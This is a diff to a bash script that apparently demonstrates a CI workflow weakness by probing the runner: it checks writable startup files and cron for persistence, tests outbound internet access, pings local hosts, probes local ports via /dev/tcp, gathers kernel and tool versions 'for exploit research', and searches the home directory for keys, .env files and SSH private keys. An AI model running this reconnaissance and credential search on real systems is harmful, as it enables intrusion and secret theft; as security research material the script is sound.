@@ -1,13 +1,42 @@
 #!/bin/bash
-echo "2. Network Exfiltration:"
-if curl -s --max-time 3 https://1.1.1.1 >/dev/null 2>&1; then
-    echo " External internet accessible"
-else
-    echo "   Network blocked"
+
+echo "1. Persistence Capability:"
+if [ -w "$HOME" ]; then
+    echo "   ✓ Home directory is writable"
+    echo "   ✓ Can install backdoors that survive"
+    
+    # Test if we can create cron jobs
+    if command -v crontab &>/dev/null; then
+        echo "   ✓ Can create scheduled tasks (cron)"
+    fi
+fi
+
+# Check if we can modify startup files
+if [ -w "$HOME/.bashrc" ] || [ -w "$HOME/.profile" ]; then
+    echo "   ✓ Can modify shell startup files"
+    echo "   ✓ Backdoor persists across workflow runs"
 fi
 echo ""
 
-# 3. Check for Docker credentials - THE KEY ISSUE
+# 2. Prove network access - FIXED
+echo "2. Network Exfiltration:"
+
+# Try multiple targets to be sure
+if curl -s --max-time 3 https://www.google.com >/dev/null 2>&1; then
+    echo "   ✓ External internet accessible (google.com reachable)"
+    echo "   ✓ Can send stolen data to attacker servers"
+elif curl -s --max-time 3 https://api.github.com >/dev/null 2>&1; then
+    echo "   ✓ External internet accessible (github.com reachable)"
+    echo "   ✓ Can send stolen data to attacker servers"
+elif ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1; then
+    echo "   ✓ External internet accessible (ping works)"
+    echo "   ✓ Can exfiltrate data"
+else
+    echo "   ✗ Network blocked"
+fi
+echo ""
+
+# 3. Check for Docker credentials 
 echo "3. Docker Registry Credentials:"
 if [ -f ~/.docker/config.json ]; then
     echo "   Docker config file exists"
@@ -36,6 +65,107 @@ else
     echo "   No Docker config file"
 fi
 
+
+# 4. Network reconnaissance - NEW
+echo "4. Internal Network Access:"
+echo "   Local IP: $(hostname -I | awk '{print $1}')"
+echo "   Hostname: $(hostname)"
+echo ""
+echo "   Checking for internal network systems..."
+
+# Check if we can reach common internal ports
+INTERNAL_IP=$(hostname -I | awk '{print $1}' | cut -d'.' -f1-3)
+if [ -n "$INTERNAL_IP" ]; then
+    echo "   Network range: ${INTERNAL_IP}.0/24"
+    
+    # Try to detect other systems (quick scan)
+    for i in 1 2 254; do
+        TARGET="${INTERNAL_IP}.${i}"
+        if ping -c 1 -W 1 "$TARGET" >/dev/null 2>&1; then
+            echo "   ✓ Host alive: $TARGET"
+        fi
+    done
+    
+    # Check for common internal services
+    echo ""
+    echo "   Checking for internal services on $(hostname -I | awk '{print $1}'):"
+    for port in 22 80 443 3306 5432 6379 8080; do
+        if timeout 1 bash -c "echo >/dev/tcp/localhost/$port" 2>/dev/null; then
+            echo "   ✓ Port $port open (potential target)"
+        fi
+    done
+fi
+echo ""
+
+# 4. Software versions - NEW  
+echo "4. Software Versions (for exploit research):"
+echo ""
+
+# Core system
+if [ -f /etc/os-release ]; then
+    OS_VERSION=$(grep PRETTY_NAME /etc/os-release | cut -d'"' -f2)
+    echo "   OS: $OS_VERSION"
+fi
+
+# Kernel (important for privilege escalation exploits)
+echo "   Kernel: $(uname -r)"
+echo ""
+
+# Development tools and libraries
+tools=(
+    "gcc:gcc --version"
+    "python:python --version"
+    "python3:python3 --version"
+    "git:git --version"
+    "curl:curl --version"
+    "openssl:openssl version"
+    "ssh:ssh -V"
+)
+
+echo "   Installed tools:"
+for tool_info in "${tools[@]}"; do
+    tool="${tool_info%%:*}"
+    cmd="${tool_info#*:}"
+    
+    if command -v "$tool" &>/dev/null; then
+        version=$($cmd 2>&1 | head -1)
+        echo "   • $tool: $version"
+    fi
+done
+
+echo "7. Previous Build Artifacts:"
+# Check for leftover sensitive data
+if [ -d "$HOME" ]; then
+    echo "   Searching for leftover credentials..."
+    
+    # Look for common secret files
+    find "$HOME" -maxdepth 3 -type f \( \
+        -name "*.pem" -o \
+        -name "*.key" -o \
+        -name "*secret*" -o \
+        -name "*password*" -o \
+        -name ".env" -o \
+        -name "credentials*" \
+    \) 2>/dev/null | while read file; do
+        echo "   ✓ Found: $file"
+    done
+    
+    # Check for SSH keys
+    if [ -d "$HOME/.ssh" ]; then
+        echo "   ✓ SSH directory exists"
+        ls -la "$HOME/.ssh" 2>/dev/null | grep -E "(id_rsa|id_ed25519)" && \
+            echo "   ✓ SSH private keys found!"
+    fi
+fi
+echo ""
+
+echo "8. Resource Access:"
+echo "   Disk usage:"
+df -h / | tail -1 | awk '{print "   Total: "$2", Available: "$4}'
+echo "   Memory:"
+free -h 2>/dev/null | grep "Mem:" | awk '{print "   Total: "$2", Available: "$7}' || echo "   N/A"
+echo "   ✓ Can consume resources (crypto mining, DoS)"
+echo ""
 
 function my_help()
 {
